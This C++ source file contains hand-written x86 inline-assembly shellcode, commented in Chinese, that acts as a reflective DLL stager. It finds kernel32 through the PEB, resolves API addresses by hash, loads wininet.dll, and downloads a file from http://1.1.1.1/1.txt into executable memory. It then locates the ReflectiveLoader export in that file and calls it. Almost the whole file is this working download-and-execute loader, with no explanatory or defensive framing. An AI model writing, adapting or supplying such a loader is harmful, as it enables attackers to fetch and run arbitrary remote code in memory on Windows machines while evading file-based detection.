#include <Windows.h>
#include <iostream>
using namespace std;


void _declspec(naked) shellCode() {

	__asm {

		push ebp
		mov ebp, esp
		call fun_payload


	// 从PEB中获取kernel32 或者kernelbase的基址
	fun_GetModule:
		push ebp
		mov ebp, esp
		sub esp, 0xc
		push esi
		mov esi, dword ptr fs : [0x30]	//PEB指针
		mov esi, [esi + 0xc]			//LDR结构体地址
		mov esi, [esi + 0x1c]			//list
		mov esi, [esi]					//list的第二项 kernel32
		mov esi, [esi + 0x8]			//dllbase
		mov eax, esi					//
		pop esi
		mov esp, ebp
		pop ebp
		retn
	
	// 从DLL中获取函数地址
	fun_GetProcAddr :
		push ebp
		mov ebp, esp
		sub esp, 0x20
		push esi
		push edi
		push edx
		push ebx
		push ecx

		mov edx, [ebp + 0X8]			//传入参数1， DLLBase
		mov esi, [edx + 0x3c]			//lf_anew
		lea esi, [edx + esi]			//Nt头
		mov esi, [esi + 0x78]			//导出表RVA
		lea esi, [edx + esi]			//导出表VA
		mov edi, [esi + 0x1c]			//EAT RVA
		lea edi, [edx + edi]			//EAT VA
		mov[ebp - 0x4], edi				//local variable , EATVA
		mov edi, [esi + 0x20]			//ENT RVA
		lea edi, [edx + edi]			//ENT VA
		mov[ebp - 0x8], edi				//local variable ,ENTVA
		mov edi, [esi + 0x24]			//EOT RVA
		lea edi, [edx + edi]			//EOT VA
		mov[ebp - 0xc], edi				//local variable ,EOTVA
		//比较字符串获取API
		xor eax, eax
		xor ebx, ebx
		cld
		jmp tag_cmpfirst
	tag_cmpLoop :
		inc ebx
	tag_cmpfirst :
		mov esi, [ebp - 0x8]			//ENT
		mov esi, [esi + ebx * 4]		//RVA, index: ebx 
		lea esi, [edx + esi]			//函数名称字符串
		mov edi, [ebp + 0xc]			//传入参数2,  要查找的目标函数hash

		push esi						//传参
		call fun_GetHashCode			//获取ENT函数名称的哈希值
		cmp edi, eax
		jne tag_cmpLoop

		mov esi, [ebp - 0xc]			//eot
		xor edi, edi					//为了不影响结果清空edi
		mov di, [esi + ebx * 2]			//eat表索引
		mov edx, [ebp - 0x4]			//eat
		mov esi, [edx + edi * 4]		//函数地址rva
		mov edx, [ebp + 0x8]			//dllbase
		lea eax, [edx + esi]			//funaddr va

		pop ecx
		pop ebx
		pop edx
		pop edi
		pop esi
		mov esp, ebp
		pop ebp
		retn 0x8

	// 计算Hash
	fun_GetHashCode:
		push ebp
		mov ebp, esp
		sub esp, 0X4
		push ecx
		push edx
		push ebx
		mov dword ptr[ebp - 0x4], 0
		mov esi, [ebp + 0x8]
		xor ecx, ecx
	tag_hashLoop :
		xor eax, eax
		mov al, [esi + ecx]
		test al, al
		jz tag_end
		mov ebx, [ebp - 0x4]
		shl ebx, 0x19
		mov edx, [ebp - 0x4]
		shr edx, 0x7
		or ebx, edx
		add ebx, eax
		mov[ebp - 0x4], ebx
		inc ecx							//ecx++
		jmp tag_hashLoop
	tag_end :
		mov eax, [ebp - 0x4]
		pop ebx
		pop edx
		pop ecx
		mov esp, ebp
		pop ebp
		retn 0x4;

	// DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
	fun_Rva2Offset:
		push ebp
		mov ebp, esp
		sub esp, 0x20
		push esi
		push edi
		push edx
		push ebx
		push ecx

		mov esi, [ebp + 0x8]			// 传入参数，uiBaseAddress
		mov edi, [esi + 0x3c]			// lf_anew
		lea edi, [esi + edi]			// Nt头
		lea edi, [edi + 0xf8]			// section headers

		jmp tag_rva2offset_first

	tag_rva2offset_loop:
		add edi, 0x28

	tag_rva2offset_first:
		mov edx, edi
		mov ebx, [edx + 0xc]			// virtualaddress
		mov ecx, [edx + 0x10]			// sizeofrawdata

		cmp [ebp + 0xc], ebx			// rva > virtualaddress
		jl tag_rva2offset_loop		    // 不成立就继续循环找 jge jle
		
		add ecx, ebx					// sizeofrawdata + virtualaddress
		cmp [ebp +0xc], ecx				// rva < sizeofrawdata + virtualaddress
		jg  tag_rva2offset_loop		    // 不成立就继续循环找

		sub [ebp + 0xc],ebx				// rva - virtualaddress 
		mov ebx,[ebp + 0xc]				//	
		add ebx, [edx + 0x14]			//	   + PointerToRawData
		mov eax, ebx					// offset


		pop ecx
		pop ebx
		pop edx
		pop edi
		pop esi
		mov esp, ebp
		pop ebp
		retn 0

	// DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
	fun_GetReflectiveLoaderOffset:
		push ebp
		mov ebp, esp
		sub esp, 0x20
		push esi
		push edi
		push edx
		push ebx
		push ecx
		
		mov edx, [ebp + 0X8]			//传入参数1， edx, DLLBase
		mov esi, [edx + 0x3c]			//lf_anew
		lea esi, [edx + esi]			//Nt头
		mov esi, [esi + 0x78]			//导出表RVA
		push esi
		push edx
		call fun_Rva2Offset
		lea esi, [edx + eax]			//esi, 导出表FOA
		mov edi, [esi + 0x1c]			//EAT RVA
		push edi						//rva
		push edx						//dll Base
		call fun_Rva2Offset				//offset
		lea edi, [edx + eax]			//EAT FOA
		mov [ebp - 0x4], edi			//epb-0x4 , EAT FOA
		

		mov edi, [esi + 0x20]			//ENT RVA
		push edi						//rva
		push edx						//dll Base
		call fun_Rva2Offset				//offset
		lea edi, [edx + eax]			//ENT FOA
		mov [ebp - 0x8], edi			//ebp-0x8 ,ENT FOA


		mov edi, [esi + 0x24]			//EOT RVA
		push edi						//rva
		push edx						//dll Base
		call fun_Rva2Offset				//offset
		lea edi, [edx + eax]			//EOT VA
		mov[ebp - 0xc], edi				//ebp-0xc ,EOT FOA

		//比较字符串获取API
		xor eax, eax
		xor ebx, ebx
		cld
		jmp tag_ref_cmpfirst
	tag_ref_cmpLoop :
		inc ebx
	tag_ref_cmpfirst :
		mov esi, [ebp - 0x8]			//ENT
		mov esi, [esi + ebx * 4]		//RVA, index: ebx 
		push esi						//rva
		push edx						//dll Base
		call fun_Rva2Offset				//offset
		lea esi, [edx + eax]			//函数名称字符串 offset
		mov edi, [ebp + 0xc]			//传入参数2,  要查找的目标函数hash
		push esi						//传参
		call fun_GetHashCode			//获取ENT函数名称的哈希值
		cmp edi, eax
		jne tag_ref_cmpLoop
		mov esi, [ebp - 0xc]			//eot
		xor edi, edi					//为了不影响结果清空edi
		mov di, [esi + ebx * 2]			//eat表索引
		mov edx, [ebp - 0x4]			//eat
		mov esi, [edx + edi * 4]		//函数地址rva
		mov edx, [ebp + 0x8]			//dllbase
		push esi						//rva
		push edx						//dll Base
		call fun_Rva2Offset				//offset
		lea eax, [edx + eax]			//funaddr va

		pop ecx
		pop ebx
		pop edx
		pop edi
		pop esi
		mov esp, ebp
		pop ebp
		retn 0x8
	//payload
	fun_payload:
		push ebp
		mov ebp, esp
		sub esp, 0x300
		call fun_GetModule
		push 0XC917432				//LoadLibraryA 哈希值
		push eax
		call fun_GetProcAddr
		mov [ebp - 0x4], eax		//LoadLibraryA 地址, Win7下面可能会有问题



		// InternetOpenA			0x4a83880c
		// InternetOpenUrlA			0xf6090295
		// InternetReadFile			0x73260a19
		// Wininet.dll				57 69 6E 69  6E 65 74 2E  64 6C 6C 00

		push 0x6c6c64
		push 0x2e74656e
		push 0x696e6957
		push esp
		call [ebp - 0x4]			// LoadLibrary Wininet.dll
		mov [ebp-0x8], eax			// ebp-0x8 Wininet.dll Base
		
		push 0x4a83880c				// InternetOpenA Hash
		push [ebp-0x8]				// Wininet.dll Base
		call fun_GetProcAddr
		mov [ebp-0xc], eax			// ebp-0xc InternetOpenA
		
		push 0xf6090295				// InternetOpenUrlA Hash
		push [ebp - 0x8]			// Wininet.dll Base
		call fun_GetProcAddr
		mov [ebp - 0x10], eax		// ebp-0x10 InternetOpenUrlA

		push 0x73260a19				// InternetReadFile Hash
		push[ebp - 0x8]				// Wininet.dll Base
		call fun_GetProcAddr
		mov[ebp - 0x14], eax		// ebp-0x14 InternetReadFile

		/*
		hInternetSession = InternetOpen(
				L"tes", // agent
				INTERNET_OPEN_TYPE_PRECONFIG,  // access
				NULL, NULL, 0);

		hURL = InternetOpenUrl(
			hInternetSession,                       // session handle
			L"http://1.1.1.1/1.txt",         // URL to access
			NULL, 0, 0, 0);
		*/
		push 0x736574				//ua, tes
		mov eax, esp
		push 0
		push 0
		push 0
		push 0
		push eax					//ua
		call[ebp - 0xc]				// call InternetOpenA
		mov [ebp-0x18], eax			// ebp-0x18 , hInternetSession

		// http://1.1.1.1/1.txt  68 74 74 .... .... .... 74
		push 0x747874
    // ....
    // ...
		push 0x312f2f3a
		push 0x70747468
		mov eax, esp

		push 0
		push 0
		push 0
		push 0
		push eax
		push [ebp - 0x18]
		call [ebp - 0x10]			// call InternetOpenUrlA
		mov [ebp-0x1c], eax			// ebp-0x1c, hURL


		// VirtualAlloc  Hash 0x1ede5967
		call fun_GetModule
		mov [ebp - 0x20], eax		// ebp-0x20 , Kernel32 or KernelBase DLL Base ， 不确定会不会有问题

		push 0x1ede5967				// InternetOpenA Hash
		push [ebp - 0x20]
		call fun_GetProcAddr
		mov[ebp - 0x24], eax		// ebp-0x24 VirtualAlloc
		// LPVOID lpAlloc = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		push 0x40					// PAGE_EXECUTE_READWRITE
		push 0x00001000				// MEM_COMMIT
		push 0x100000				// 16MB的空间，待优化
		push 0x0					// NULL
		call [ebp-0x24]				// VirtualAlloc 0x1000000
		// 待清空分配空间
		mov [ebp-0x28], eax			// ebp-0x28 VirtualAlloc分配的空间
		//mov [ebp - 0x2c],0			// 置为0
		//mov [ebp - 0x30],0
		//InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
		//push [ebp-0x2c]				// dwBytesRead
		push esp
		push 0x100000				// 要去读的size ， 一次性读了16M ,待优化
		push [ebp - 0x28]			// virtualalloc 分配的buff
		push [ebp - 0x1c]			// hURL
		call [ebp - 0x14]			// call InternetReadFile
		// 句柄待关闭,待优化

		// 计算ReflectiveLoader的偏移	_ReflectiveLoader@4
		push 0x98BD76A5				// ReflectiveLoader Hash 98BD76A5
		push[ebp - 0x28]			
		call fun_GetReflectiveLoaderOffset
		call eax

		mov esp, ebp
		pop ebp
		ret
	}
}

DWORD getHashCode(const char* strname)
{
	DWORD digest = 0;
	while (*strname)
	{
		digest = (digest << 25 | digest >> 7);
		digest = digest + *strname;
		strname++;
	}
	return digest;
}


int main()
{
	printf("begin\n");
	shellCode();

}
